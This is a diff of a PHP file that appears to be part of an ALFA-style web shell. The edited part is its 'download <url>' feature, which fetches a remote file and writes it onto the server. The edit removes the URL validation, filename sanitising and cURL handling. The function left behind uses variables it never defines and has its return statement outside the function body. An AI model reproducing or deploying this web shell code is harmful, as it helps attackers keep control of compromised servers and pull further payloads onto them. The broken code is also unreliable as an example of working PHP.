@@ -76,55 +76,22 @@ function perm_color($path){
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
 function __download_secure($url, $optname=''){
-  // Simpan di direktori aktif (yang sedang dibuka user)
-  $base = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : getcwd();
-
-  if (!filter_var($url, FILTER_VALIDATE_URL))
-    return ['ok'=>false,'err'=>'Invalid URL','path'=>null];
-
-  $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'file.bin');
-  $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
-  $filename = $optname
-    ? preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname))
-    : $basename;
-
-  $target = rtrim($base,'/')."/".$filename;
-  $ok=false;$err='';
-
-  // Download pakai cURL
-  if (function_exists('curl_init')) {
-    $ch=curl_init($url);$fp=@fopen($target,'w');
-    if($fp){
-      curl_setopt_array($ch,[
-        CURLOPT_FILE=>$fp,
-        CURLOPT_FOLLOWLOCATION=>true,
-        CURLOPT_TIMEOUT=>90,
-        CURLOPT_FAILONERROR=>true
-      ]);
-      curl_exec($ch);
-      $cerr=curl_error($ch);
-      $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
-      curl_close($ch);fclose($fp);
-      if(!$cerr && $code<400 && is_file($target)) $ok=true;
-      else{@unlink($target);$err=$cerr?:("HTTP ".$code);}
-    }else $err='Write fail';
-  }
-
-  // Fallback tanpa curl
   if(!$ok){
-    $data=@file_get_contents($url);
-    if($data!==false && @file_put_contents($target,$dta)!==false)
-      $ok=true;
-    else $err=$err?:'Download failed';
-  }
-
-  if($ok)@chmod($target,0644);
-
-  // Path relatif biar tampil rapi
-  $relative = str_replace(getcwd(), '.', realpath($target));
-
-  return ['ok'=>$ok,'err'=>$err,'path'=>$relative];
+  $data=@file_get_contents($url);
+  if($data!==false && @file_put_contents($target,$data)!==false)
+    $ok=true;
+  else $err=$err?:'Download failed';
 }
+
+if($ok)@chmod($target,0644);
+
+// tampilkan path absolut
+return [
+  'ok'=>$ok,
+  'err'=>$err,
+  'path'=>realpath($target)
+];
+
 
 
 function alfaremotedl(){
@@ -144,7 +111,10 @@ function alfaremotedl(){
       $p=preg_split('/\s+/',$cmd,3);
       if(count($p)<2||strtolower($p[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
       else{$r=__download_secure($p[1],$p[2]??'');
-        echo $r['ok']?"<div style='color:#7f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
+        echo $r['ok']
+  ? "<div style='color:#6f6'>✅ Success:<br><span style='color:#59d6ff'>".htmlspecialchars($r['path'])."</span></div>"
+  : "<div style='color:#f66'>❌ Error: ".htmlspecialchars($r['err'])."</div>";
+}
     }
     echo"</div>";
   }
